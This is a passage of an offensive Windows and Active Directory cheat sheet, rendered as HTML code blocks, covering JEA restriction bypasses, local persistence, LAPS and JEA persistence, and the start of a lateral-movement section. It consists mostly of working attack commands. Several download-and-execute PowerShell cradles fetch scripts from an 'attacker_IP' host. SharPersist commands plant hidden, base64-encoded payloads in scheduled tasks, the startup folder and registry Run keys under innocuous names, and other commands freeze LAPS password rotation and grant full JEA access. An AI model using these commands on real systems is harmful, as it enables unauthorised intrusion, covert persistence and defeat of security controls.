style="padding-right: 0.1px;"><span class="cm-comment">#Look at the function code</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">(</span><span class="cm-builtin">Get-Command</span> <span class="cm-operator">&lt;</span><span class="cm-keyword">function</span><span class="cm-operator">&gt;</span><span class="cm-punctuation">).</span><span class="cm-identifier">Definition</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Or</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">gcm</span> <span class="cm-operator">&lt;</span><span class="cm-keyword">function</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">show</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 163px;"></div><div class="CodeMirror-gutters" style="height: 203px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-for-example-if-it-is">For example if it is possible to control the <code>$param</code> parameter here <code>$ExecutionContext.InvokeCommand.ExpandString($param)</code>, it is possible to execute some code by passing this as argument : <code>'$(powershell.exe -c "iEx (New-Object System.Net.WebClient).DownloadString(''http://attacker_IP/Invoke-HelloWorld.ps1'')")'</code></p>
<h4 id="bkmrk-function-creation">Function creation</h4>
<p id="bkmrk-if-the-jea-allowed-t">If the JEA allowed to create a new function it can be abused</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1129px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 1128.9px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">Invoke-Command</span> <span class="cm-operator">-</span><span class="cm-identifier">Session</span> <span class="cm-variable-2">$sess</span> <span class="cm-operator">-</span><span class="cm-identifier">ScriptBlock</span> <span class="cm-punctuation">{</span><span class="cm-keyword">function</span> <span class="cm-identifier">blackwasp</span> <span class="cm-punctuation">{</span><span class="cm-builtin">iex</span> <span class="cm-punctuation">(</span><span class="cm-builtin">new-object</span> <span class="cm-identifier">net</span><span class="cm-punctuation">.</span><span class="cm-identifier">webclient</span><span class="cm-punctuation">).</span><span class="cm-identifier">downloadstring</span><span class="cm-punctuation">(</span><span class="cm-string">'http://attacker_IP/Invoke-HelloWorld.ps1'</span><span class="cm-punctuation">)}}</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">Invoke-Command</span> <span class="cm-operator">-</span><span class="cm-identifier">Session</span> <span class="cm-variable-2">$sess</span> <span class="cm-operator">-</span><span class="cm-identifier">ScriptBlock</span> <span class="cm-punctuation">{</span><span class="cm-identifier">blackwasp</span><span class="cm-punctuation">}</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 105px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-with-another-winrrm-">With another WinrRM client</h4>
<p id="bkmrk-sometimes-this-winrm">Sometimes this WinRM in Python can bypass the JEA</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 962px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 185px; min-width: 962.429px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">import</span> <span class="cm-variable">winrm</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">s</span> <span class="cm-operator">=</span> <span class="cm-variable">winrm</span>.<span class="cm-property">Session</span>(<span class="cm-string">'target_IP'</span>, <span class="cm-variable">auth</span><span class="cm-operator">=</span>(<span class="cm-string">'administrator'</span>, <span class="cm-string">'password'</span>))</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">r</span> <span class="cm-operator">=</span> <span class="cm-variable">s</span>.<span class="cm-property">run_cmd</span>(<span class="cm-string">'powershell -c "IEX((New-Object System.Net.WebClient).DownloadString(\'http://attacker_IP/Invoke-HelloWorld.ps1\'))"'</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">print</span> <span class="cm-variable">r</span>.<span class="cm-property">status_code</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">print</span> <span class="cm-variable">r</span>.<span class="cm-property">std_out</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">print</span> <span class="cm-variable">r</span>.<span class="cm-property">std_err</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 185px;"></div><div class="CodeMirror-gutters" style="height: 235px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h2 id="bkmrk-local-persistence">Local Persistence</h2>
<h3 id="bkmrk-sharpersist">SharPersist</h3>
<p id="bkmrk-sharpersist.exe-can-"><code>SharPersist.exe</code> can be used for local persistence on a workstation.</p>
<p id="bkmrk-common-userland-pers">Common userland persistences:</p>
<ul id="bkmrk-hkcu-%2F-hklm-registry"><li>HKCU / HKLM Registry Autoruns</li>
<li>Scheduled Tasks</li>
<li>Startup Folder</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1136px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 271px; min-width: 1136.14px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Convert command to execute to base64</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$str</span> <span class="cm-operator">=</span> <span class="cm-string">'IEX ((new-object net.webclient).downloadstring("http://attacker_ip/a"))'</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">[</span><span class="cm-identifier">System</span><span class="cm-punctuation">.</span><span class="cm-identifier">Convert</span><span class="cm-punctuation">]</span><span class="cm-operator">::</span><span class="cm-identifier">ToBase64String</span><span class="cm-punctuation">([</span><span class="cm-identifier">System</span><span class="cm-punctuation">.</span><span class="cm-identifier">Text</span><span class="cm-punctuation">.</span><span class="cm-identifier">Encoding</span><span class="cm-punctuation">]</span><span class="cm-operator">::</span><span class="cm-identifier">Unicode</span><span class="cm-punctuation">.</span><span class="cm-identifier">GetBytes</span><span class="cm-punctuation">(</span><span class="cm-variable-2">$str</span><span class="cm-punctuation">))</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Via scheduled task</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">SharPersist</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">-</span><span class="cm-identifier">t</span> <span class="cm-identifier">schtask</span> <span class="cm-operator">-</span><span class="cm-identifier">c</span> <span class="cm-string">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"</span> <span class="cm-operator">-</span><span class="cm-identifier">a</span> <span class="cm-string">"-nop -w hidden -enc &lt;base64&gt;"</span> <span class="cm-operator">-</span><span class="cm-identifier">n</span> <span class="cm-string">"Updater"</span> <span class="cm-operator">-</span><span class="cm-identifier">m</span> <span class="cm-identifier">add</span> <span class="cm-operator">-</span><span class="cm-identifier">o</span> <span class="cm-identifier">hourly</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Via startup folder</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">SharPersist</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">-</span><span class="cm-identifier">t</span> <span class="cm-identifier">startupfolder</span> <span class="cm-operator">-</span><span class="cm-identifier">c</span> <span class="cm-string">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"</span> <span class="cm-operator">-</span><span class="cm-identifier">a</span> <span class="cm-string">"-nop -w hidden -enc &lt;base64&gt;"</span> <span class="cm-operator">-f</span> <span class="cm-string">"UserEnvSetup"</span> <span class="cm-operator">-</span><span class="cm-identifier">m</span> <span class="cm-identifier">add</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Via registry key, first create a .exe beacon named updater.exe, then</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">SharPersist</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">-</span><span class="cm-identifier">t</span> <span class="cm-identifier">reg</span> <span class="cm-operator">-</span><span class="cm-identifier">c</span> <span class="cm-string">"C:\ProgramData\Updater.exe"</span> <span class="cm-operator">-</span><span class="cm-identifier">a</span> <span class="cm-string">"/q /n"</span> <span class="cm-operator">-</span><span class="cm-identifier">k</span> <span class="cm-string">"hkcurun"</span> <span class="cm-operator">-</span><span class="cm-identifier">v</span> <span class="cm-string">"Updater"</span> <span class="cm-operator">-</span><span class="cm-identifier">m</span> <span class="cm-identifier">add</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 271px;"></div><div class="CodeMirror-gutters" style="height: 321px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-laps-persistence">LAPS Persistence</h3>
<p id="bkmrk-to-prevent-a-machine">To prevent a machine to update its LAPS password, it is possible to set the update date in the futur.</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 745px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 745.286px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Set-DomainObject</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target_machine</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-builtin">Set</span> <span class="cm-punctuation">@{</span><span class="cm-string">"ms-mcs-admpwdexpirationtime"</span><span class="cm-operator">=</span><span class="cm-string">"232609935231523081"</span><span class="cm-punctuation">}</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-jea-persistence">JEA Persistence</h3>
<p id="bkmrk-allows-every-command">Allows every commands to a user on a machine.</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 543px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 77px; min-width: 542.619px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Set-JEAPermissions</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-identifier">dc</span> <span class="cm-operator">-</span><span class="cm-identifier">SamAccountName</span> <span class="cm-identifier">user1</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">Enter-PSSession</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-identifier">dc</span> <span class="cm-operator">-</span><span class="cm-identifier">ConfigurationName</span> <span class="cm-identifier">microsoft</span><span class="cm-punctuation">.</span><span class="cm-identifier">powershell64</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 77px;"></div><div class="CodeMirror-gutters" style="height: 127px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h2 id="bkmrk-lateral-movement">Lateral Movement</h2>
<h3 id="bkmrk-powershell-remoting">PowerShell Remoting</h3>
<h4 id="bkmrk-from-one-computer-to">From one computer to other ones</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 572px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 185px; min-width: 571.571px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$sess</span> <span class="cm-operator">=</span> <span class="cm-builtin">New-PSSession</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">computername</span><span class="cm-operator">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">Enter-PSSession</span> <span class="cm-operator">-</span><span class="cm-identifier">Session</span> <span class="cm-variable-2">$sess</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Provide PS credentials</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span 